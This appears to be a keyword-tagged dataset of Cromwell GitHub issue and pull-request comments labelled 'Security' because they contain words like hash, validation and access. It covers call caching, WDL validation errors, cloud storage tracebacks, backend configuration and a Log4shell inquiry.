Security,@ysp0606 FYI we've had to disable our Alibaba tests for Cromwell while we wait for our OSS access to be restored. More info in https://broadworkbench.atlassian.net/browse/BA-6345. On our last update we gave Alibaba support a temporary access key from our account so they can try and debug the error code.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5467#issuecomment-606119666:91,access,access,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5467#issuecomment-606119666,2,['access'],['access']
Security,"A current version of Womtool still validates these tasks as OK, so the problem continues to exist in draft-2. Upgrading the tasks to WDL 1.0 causes Womtool validation to fail with messages of varying helpfulness:. ```; version 1.0. task myTask {. input {; File f; }. command {; touch ${f.bam.bai}; }; }; ```; ```; Failed to process task definition 'myTask' (reason 1 of 1):; Failed to process expression 'f.bam.bai' (reason 1 of 1):; No such field 'bam' on type File; ```; ---; ```; version 1.0. task myTask {. input {; File f; }. command {; touch ${f%%.bam.bai}; }; }; ```; ```; Failed to read task definition at line 3 column 6 (reason 1 of 2):; Failed to convert AST node to ExpressionElement (reason 1 of 2):; No attribute 'rhs' found on Ast 'Remainder'. Did you mean: lhs; Failed to read task definition at line 3 column 6 (reason 2 of 2):; Failed to convert AST node to ExpressionElement (reason 2 of 2):; No attribute 'value' found on Ast 'MemberAccess'. Did you mean: member; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2873#issuecomment-439426356:35,validat,validates,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2873#issuecomment-439426356,2,['validat'],"['validates', 'validation']"
Security,A few `HashError` catches and a few extra Event possibilities `when(BackendIsCopyingCachedOutputs)` but mainly this looks good.; Happy to give this a thumb 👍 assuming those are added. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1365/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1365#issuecomment-245036424:7,Hash,HashError,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1365#issuecomment-245036424,1,['Hash'],['HashError']
Security,"A few observations:; - If the EJEA is aborted, we could stop hashing the remaining files; - If the EJHA is done, it could stop hashing the remaining files; - Since the EJHA already blocks work into chunks of 100 (and BackendFileHashers tend to be synchronous), it could simply not send the next batch if it knows it doesn't need to; - If the set of initial hashes are a cache miss (and cache writing is disabled), we don't need to send the files for hashing in the first place",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1503:61,hash,hashing,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1503,4,['hash'],"['hashes', 'hashing']"
Security,"A philosophical question, not a leading one - what about having a persistent validation actor instead of creating them per-validation?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195387043:77,validat,validation,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195387043,2,['validat'],['validation']
Security,"A simple grep through the source code reveals several hits with Log4j:. ```; CromwellRefdiskManifestCreator/pom.xml: <groupId>org.apache.logging.log4j</groupId>; CromwellRefdiskManifestCreator/pom.xml: <artifactId>log4j-core</artifactId>; CromwellRefdiskManifestCreator/pom.xml: <groupId>org.apache.logging.log4j</groupId>; CromwellRefdiskManifestCreator/pom.xml: <artifactId>log4j-api</artifactId>; CromwellRefdiskManifestCreator/src/main/java/org/broadinstitute/manifestcreator/CromwellRefdiskManifestCreatorApp.java:import org.apache.logging.log4j.Level;; CromwellRefdiskManifestCreator/src/main/java/org/broadinstitute/manifestcreator/CromwellRefdiskManifestCreatorApp.java:import org.apache.logging.log4j.LogManager;; CromwellRefdiskManifestCreator/src/main/java/org/broadinstitute/manifestcreator/CromwellRefdiskManifestCreatorApp.java:import org.apache.logging.log4j.Logger;; CromwellRefdiskManifestCreator/src/main/java/org/broadinstitute/manifestcreator/CromwellRefdiskManifestCreatorApp.java:import org.apache.logging.log4j.core.config.Configurator;; project/Dependencies.scala: // Replace all log4j usage with slf4j; project/Dependencies.scala: // https://www.slf4j.org/legacy.html#log4j-over-slf4j; project/Dependencies.scala: ""org.slf4j"" % ""log4j-over-slf4j"" % slf4jV; ```. I wasn't able to expose a vulnerability by using malicious code but my test is probably not extensive.; It looks like this lib is used in a packaging tool of Cromwell so probably not executed during production.; On the other hand, slj4j seems to be used everywere. Is that abstraction layer vulnerable ?. Could you please let us know if you believe Cromwell is affected by Log4shell ?. Thanks,",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6588:1304,expose,expose,1304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588,1,['expose'],['expose']
Security,"A very common way of producing a side .md5 file is to use something like. `md5 -q dbsnp_138.vcf > dbsnp_138.vcf.md5`. Which produces a trailing newline character, which cromwell reads and interprets as part of the hash, thus causing cache misses against files that (a) were hashed by cromwell or (b) don't have a newline. Not only isn't this the desired behavior... it's very confusing because it appears that sometimes call caching works and other times it does not. Cromwell should strip out all trailing whitespace (e.g. \n, \r\n) from the data read in the .md5 file",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2621:214,hash,hash,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2621,2,['hash'],"['hash', 'hashed']"
Security,A/C:; - centaur test that validates that inputs schemas are used for validation when the input specifies a format; - centaur test that validates that inputs schemas are ignored for validation when the input doesn't specify a format,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3569:26,validat,validates,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3569,4,['validat'],"['validates', 'validation']"
Security,"A/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam -> /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam (cp failed: gsutil -q -m cp gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam, command failed: Traceback (most recent call last):\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 75, in <module>\n main()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 22, in main\n project, account = bootstrapping.GetActiveProjectAndAccount()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py\"", line 205, in GetActiveProjectAndAccount\n project_name = properties.VALUES.core.project.Get(validate=False)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1221, in Get\n required)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoP",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:13433,validat,validate,13433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['validat'],['validate']
Security,"A/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam -> /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam (cp failed: gsutil -q -m cp gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam, command failed: Traceback (most recent call last):\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 75, in <module>\n main()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 22, in main\n project, account = bootstrapping.GetActiveProjectAndAccount()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py\"", line 205, in GetActiveProjectAndAccount\n project_name = properties.VALUES.core.project.Get(validate=False)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1221, in Get\n required)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoP",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:10246,validat,validate,10246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['validat'],['validate']
Security,AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCach,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:3574,hash,hashes,3574,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,AN-184 Remove unused Batch restrict-metadata-access config,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7577:45,access,access,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7577,1,['access'],['access']
Security,API Workflow ID validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3517:16,validat,validation,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3517,1,['validat'],['validation']
Security,"ASTDB=~{blastdb} ; blastn \; -query ~{fasta} -db nt -num_threads 24 -evalue 1 -outfmt '6' -out ~{out_file}; >>>; output { File out = out_file }; runtime { docker: ""ncbi/blast:2.10.1"" }; }; ```. **confiuration snippet - localization only:**; ```; filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; # Call caching strategies; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""md5""; check-sibling-md5: false; }; }; }; ```. **logs:**; ```; [2020-08-08 19:20:00,49] [error] Failed to hash ""../../data/blast/blastdb"": Is a directory; [2020-08-08 19:20:00,49] [warn] Localization via hard link has failed: /workflows/cromwell-executions/good_donor_good_recipient/f7947643-2729-483f-b987-44ef932f88bd/call-blaster/main/6e4fa8a1-0d72-486e-a9ae-254319c4915d/call-blaster/shard-20/inputs/2058596876/blastdb -> /data/blast/blastdb: Operation not permitted; [2020-08-08 19:20:00,49] [error] 6e4fa8a1:main.blaster:46:1: Hash error (Is a directory), disabling call caching for this job.; ```. **contents of the BLASTDB directory:**; ```; /data/blast/blastdb$ ls; nt.00.nhd nt.01.nhd nt.02.nhd nt.03.nhd nt.04.nhd nt.05.nhd nt.06.nhd nt.07.nhd nt.08.nhd nt.09.nhd nt.10.nhd nt.11.nhd nt.12.nhd nt.13.nhd nt.14.nhd nt.15.nhd nt.16.nhd nt.17.nhd nt.18.nhd nt.19.nhd nt.20.nhd nt.21.nhd nt.22.nhd nt.23.nhd nt.24.nhd nt.nal nt.00.nhi nt.01.nhi nt.02.nhi nt.03.nhi nt.04.nhi nt.05.nhi nt.06.nhi nt.07.nhi nt.08.nhi nt.09.nhi nt.10.nhi nt.11.nhi nt.12.nhi nt.13.nhi nt.14.nhi nt.15.nhi nt.16.nhi nt.17.nhi nt.18.nhi nt.19.nhi nt.20.nhi nt.21.nhi nt.22.nhi nt.23.nhi nt.24.nhi nt.ndb nt.00.nhr nt.01.nhr nt.02.nhr nt.03.nhr nt.04.nhr nt.05.nhr nt.06.nhr nt.07.nhr nt.08.nhr nt.09.nhr nt.10.nhr nt.11.nhr nt.12.nhr nt.13.nhr nt.14.nhr nt.15.nhr nt.16.nhr nt.17.nhr nt.18.nhr nt.19.nhr nt.20.nhr nt.21.nhr nt.22.nhr nt.23.nhr nt.24.nhr nt.nos nt.00.nin nt.01.nin nt.02.nin nt.03.nin nt.04.nin nt.05.nin nt.06.nin nt.07.nin nt.08.nin nt.09.nin nt.10.nin nt.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5737:2068,Hash,Hash,2068,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5737,1,['Hash'],['Hash']
Security,AWS Batch: Docker hash lookup failed with code,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4345:18,hash,hash,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4345,1,['hash'],['hash']
Security,AWS ECR Remote Hashing,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7444:15,Hash,Hashing,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7444,1,['Hash'],['Hashing']
Security,AWS S3: Can't access data outside my region (Status Code: 301),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4731:14,access,access,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4731,1,['access'],['access']
Security,Access to optional variables in conditionals broken for WDL 1.0 (works w draft-2),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981:0,Access,Access,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981,1,['Access'],['Access']
Security,Access to runtime attributes within tasks,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4741:0,Access,Access,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4741,1,['Access'],['Access']
Security,AccessDenied for the raw log. I can't see anything attempting to compile CWL in the cooked log. `src/bin/travis/test.sh` is shown as running for 0.01 seconds. 😕,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2788#issuecomment-339511828:0,Access,AccessDenied,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2788#issuecomment-339511828,1,['Access'],['AccessDenied']
Security,ActorCell.scala:431); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:521); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadata,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:6114,validat,validation,6114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['validat'],['validation']
Security,"ActorFactory""; config {; run-in-background = true; runtime-attributes = ""String? docker Int? max_runtime = 2""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". # Root directory where Cromwell writes job results. This directory must be; # visible and writeable by the Cromwell process as well as the jobs that Cromwell; # launches.; root: ""cromwell-executions"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; hashing-strategy: ""path"". # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; # If false or the md5 does not exist, will proceed with the above-defined hashing strategy.; check-sibling-md5: false; }; }; }; }; }; }; }. database {; db.url = ""jdbc:mysql://mysql-db/cromwell_db?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true""; db.user = ""cromwell""; db.password = ""cromwell""; db.driver = ""com.mysql.cj.jdbc.Driver""; profile = ""slick.jdbc.MySQLProfile$""; db.connectionTimeout = 15000; }; ```. and here is my cormwell dockerfile:. ```; FROM broadinstitute/cromwell:develop. RUN git clone https://github.com/vishnubob/wait-for-it.git; RUN mkdir cromwell-working-dir; WORKDIR cromwell-working-dir. COPY ./app-config /app-config. ENTRYPOINT [""/bin/sh"", ""-c""]; ```. when i submit a wdl did not use docker it was ok. but when i submit a wdl need to use docker, a error apear.; ```; /cromwell-working-dir/cromwell-executions/RNAseq/26e3c339-39d3-442f-b93e-8269dc7f9fa6/call-fastp_pe/shard-7/execution/script.submit: line 2: do",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7006:2177,hash,hash,2177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7006,1,['hash'],['hash']
Security,Actually ValidateActor only is ever called as a PerRequest.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/148#issuecomment-134228130:9,Validat,ValidateActor,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/148#issuecomment-134228130,1,['Validat'],['ValidateActor']
Security,"Actually if that's true, then I think this is related to #589. @yfarjoun This is assuming that you were submitting with swagger (vs curl in the other issue) and that the project the cromwell server you were using was not the same as broad-gp-gotc-pilot (so it didn't have access to those input files).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209937270:272,access,access,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209937270,1,['access'],['access']
Security,Actually the link I posted (also it's one of the key examples in the Akka docs) might not be so useful as it looks like a lot of the places we're using ConfigFactory.load don't have access to the main actor system,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141:182,access,access,182,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141,1,['access'],['access']
Security,"Actually, the main problem is that the error is so cryptic one cannot tell; that a file is causing the problem, nor which file it is, even if one had; an inkling that it's a missing file problem. so I have to resort to divide; and conquer in order to identify the missing file...and that's a pain. On Sun, Jul 10, 2016 at 10:08 PM, Jeff Gentry notifications@github.com; wrote:. > The former. He was looking for a backend-aware validation type behavior; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231627459,; > or mute the thread; > https://github.com/notifications/unsubscribe/ACnk0hYeQnaJcsNEVJlnxrz9-tA880TLks5qUaWXgaJpZM4JHehH; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231711585:427,validat,validation,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231711585,1,['validat'],['validation']
Security,Add WDL draft 3 to womtool validation tests,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3479:27,validat,validation,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3479,1,['validat'],['validation']
Security,Add a default-application authentication mode that uses Application D…,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/329:26,authenticat,authentication,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/329,2,['authenticat'],['authentication']
Security,Add a new API endpoint to CromIAM which will allow a user to update the collection name for one or more workflows in a one to many fashion - i.e. one collection name will be applied to 1+ workflows. If Sam says that the user does not have access to this collection name it will be an error,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2839:239,access,access,239,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2839,1,['access'],['access']
Security,"Add abort, workflow store delete to coordinated access actor [WA-334]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906:48,access,access,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906,1,['access'],['access']
Security,Add all required validation to ValidationActor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/488:17,validat,validation,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/488,2,"['Validat', 'validat']","['ValidationActor', 'validation']"
Security,Add an option to turn off Docker hash lookups,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2600:33,hash,hash,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2600,1,['hash'],['hash']
Security,Add an option to use filename as part of the call caching hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3054:58,hash,hash,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3054,1,['hash'],['hash']
Security,Add authenticated LDAP to proxy config,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/381:4,authenticat,authenticated,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/381,1,['authenticat'],['authenticated']
Security,Add basic backend validation for JES PBE config,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/812:18,validat,validation,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/812,1,['validat'],['validation']
Security,Add basic backend validation for Local PBE config,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/811:18,validat,validation,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/811,1,['validat'],['validation']
Security,Add call caching option to treat file paths as the hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1271:51,hash,hash,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1271,2,['hash'],['hash']
Security,Add integration tests for AWS authentication,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3747:30,authenticat,authentication,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3747,1,['authenticat'],['authentication']
Security,Add new hash path strategy with last modified time,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4405:8,hash,hash,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4405,1,['hash'],['hash']
Security,Add restrict-metadata-access,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2435:22,access,access,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2435,1,['access'],['access']
Security,Add retries to credential validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2314:26,validat,validation,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2314,1,['validat'],['validation']
Security,Add tests for more complex member accesses,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3564:34,access,accesses,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3564,1,['access'],['accesses']
